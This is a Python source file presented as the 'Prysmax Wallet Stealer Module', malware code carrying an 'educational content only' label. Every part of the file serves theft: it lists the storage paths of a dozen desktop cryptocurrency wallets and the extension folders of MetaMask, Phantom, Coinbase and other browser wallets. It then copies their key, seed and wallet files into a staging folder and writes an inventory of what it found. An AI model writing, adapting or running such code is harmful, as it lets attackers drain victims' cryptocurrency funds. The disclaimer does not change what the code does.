#!/usr/bin/env python3
"""
Prysmax Wallet Stealer Module
Educational content only
"""

import os
import sys
import json
import shutil
from pathlib import Path

class WalletStealer:
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.wallets = {
            "Exodus": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\Exodus"),
                "files": ["exodus.wallet", "seed.seco", "info.seco"]
            },
            "Atomic": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\atomic"),
                "files": ["Local Storage", "IndexedDB"]
            },
            "Electrum": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\Electrum\\wallets"),
                "files": ["*"]
            },
            "Ethereum": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\Ethereum\\keystore"),
                "files": ["*"]
            },
            "Bitcoin": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\Bitcoin"),
                "files": ["wallet.dat", "bitcoin.conf"]
            },
            "Litecoin": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\Litecoin"),
                "files": ["wallet.dat", "litecoin.conf"]
            },
            "Dash": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\DashCore"),
                "files": ["wallet.dat", "dash.conf"]
            },
            "Zcash": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\Zcash"),
                "files": ["wallet.dat"]
            },
            "Bytecoin": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\bytecoin"),
                "files": ["*.wallet"]
            },
            "Jaxx": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\com.liberty.jaxx\\IndexedDB"),
                "files": ["*"]
            },
            "Coinomi": {
                "path": os.path.expanduser("~\\AppData\\Local\\Coinomi\\Coinomi\\wallets"),
                "files": ["*.wallet"]
            },
            "Guarda": {
                "path": os.path.expanduser("~\\AppData\\Roaming\\Guarda"),
                "files": ["*"]
            }
        }
        
        # Browser extension wallets
        self.browser_wallets = {
            "MetaMask": {
                "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
                "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
                "firefox": "~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\*\\storage\\default\\moz-extension+++*"
            },
            "Phantom": {
                "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa",
                "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"
            },
            "Binance": {
                "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp",
                "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"
            },
            "Coinbase": {
                "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad",
                "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"
            },
            "TronLink": {
                "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec",
                "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"
            },
            "Ronin": {
                "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec",
                "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"
            },
            "Trust": {
                "chrome": "~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph",
                "edge": "~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"
            }
        }
    
    def steal(self):
        """Main wallet stealing function"""
        try:
            wallet_dir = os.path.join(self.output_dir, "Wallets")
            os.makedirs(wallet_dir, exist_ok=True)
            
            # Steal desktop wallets
            self.steal_desktop_wallets(wallet_dir)
            
            # Steal browser extension wallets
            self.steal_browser_wallets(wallet_dir)
            
        except Exception as e:
            print(f"[WALLET] General error: {e}")
    
    def steal_desktop_wallets(self, output_dir):
        """Steal desktop wallet applications"""
        desktop_dir = os.path.join(output_dir, "Desktop_Wallets")
        os.makedirs(desktop_dir, exist_ok=True)
        
        for wallet_name, wallet_info in self.wallets.items():
            try:
                wallet_path = wallet_info["path"]
                if os.path.exists(wallet_path):
                    wallet_output = os.path.join(desktop_dir, wallet_name)
                    os.makedirs(wallet_output, exist_ok=True)
                    
                    self.copy_wallet_files(wallet_path, wallet_output, wallet_info["files"])
                    print(f"[WALLET] Stolen {wallet_name} wallet")
                    
            except Exception as e:
                print(f"[WALLET] Error stealing {wallet_name}: {e}")
    
    def steal_browser_wallets(self, output_dir):
        """Steal browser extension wallets"""
        browser_dir = os.path.join(output_dir, "Browser_Extensions")
        os.makedirs(browser_dir, exist_ok=True)
        
        for wallet_name, browsers in self.browser_wallets.items():
            try:
                wallet_output = os.path.join(browser_dir, wallet_name)
                os.makedirs(wallet_output, exist_ok=True)
                
                for browser, path in browsers.items():
                    expanded_path = os.path.expanduser(path)
                    
                    if "*" in expanded_path:
                        # Handle wildcard paths
                        self.copy_wildcard_paths(expanded_path, wallet_output, browser)
                    else:
                        if os.path.exists(expanded_path):
                            browser_output = os.path.join(wallet_output, browser)
                            self.copy_directory(expanded_path, browser_output)
                            
            except Exception as e:
                print(f"[WALLET] Error stealing {wallet_name} extension: {e}")
    
    def copy_wallet_files(self, source_path, dest_path, files):
        """Copy specific wallet files"""
        try:
            for file_pattern in files:
                if file_pattern == "*":
                    # Copy entire directory
                    self.copy_directory(source_path, dest_path)
                else:
                    # Copy specific files
                    file_path = os.path.join(source_path, file_pattern)
                    if os.path.exists(file_path):
                        if os.path.isfile(file_path):
                            shutil.copy2(file_path, dest_path)
                        else:
                            dest_file_path = os.path.join(dest_path, file_pattern)
                            self.copy_directory(file_path, dest_file_path)
        except Exception as e:
            print(f"[WALLET] Error copying wallet files: {e}")
    
    def copy_directory(self, source, destination):
        """Copy directory recursively"""
        try:
            if os.path.exists(source):
                shutil.copytree(source, destination, dirs_exist_ok=True)
        except Exception as e:
            print(f"[WALLET] Error copying directory {source}: {e}")
    
    def copy_wildcard_paths(self, pattern_path, dest_path, browser_name):
        """Handle wildcard paths for Firefox profiles"""
        try:
            import glob
            
            # Get all matching paths
            matching_paths = glob.glob(pattern_path)
            
            for path in matching_paths:
                if os.path.exists(path):
                    # Create unique destination for each match
                    path_hash = str(hash(path))[-8:]
                    dest = os.path.join(dest_path, f"{browser_name}_{path_hash}")
                    self.copy_directory(path, dest)
                    
        except Exception as e:
            print(f"[WALLET] Error with wildcard path {pattern_path}: {e}")
    
    def get_wallet_info(self):
        """Get information about found wallets"""
        try:
            info = {
                "desktop_wallets": [],
                "browser_extensions": [],
                "total_found": 0
            }
            
            # Check desktop wallets
            for wallet_name, wallet_info in self.wallets.items():
                if os.path.exists(wallet_info["path"]):
                    info["desktop_wallets"].append({
                        "name": wallet_name,
                        "path": wallet_info["path"],
                        "size": self.get_directory_size(wallet_info["path"])
                    })
                    info["total_found"] += 1
            
            # Check browser extensions
            for wallet_name, browsers in self.browser_wallets.items():
                found_browsers = []
                for browser, path in browsers.items():
                    expanded_path = os.path.expanduser(path)
                    if "*" not in expanded_path and os.path.exists(expanded_path):
                        found_browsers.append(browser)
                
                if found_browsers:
                    info["browser_extensions"].append({
                        "name": wallet_name,
                        "browsers": found_browsers
                    })
                    info["total_found"] += 1
            
            # Save wallet info
            info_path = os.path.join(self.output_dir, "wallet_info.json")
            with open(info_path, "w") as f:
                json.dump(info, f, indent=2)
                
            return info
            
        except Exception as e:
            print(f"[WALLET] Error getting wallet info: {e}")
            return {"total_found": 0}
    
    def get_directory_size(self, path):
        """Get directory size in bytes"""
        try:
            total_size = 0
            for dirpath, dirnames, filenames in os.walk(path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    if os.path.exists(file_path):
                        total_size += os.path.getsize(file_path)
            return total_size
        except Exception as e:
            return 0

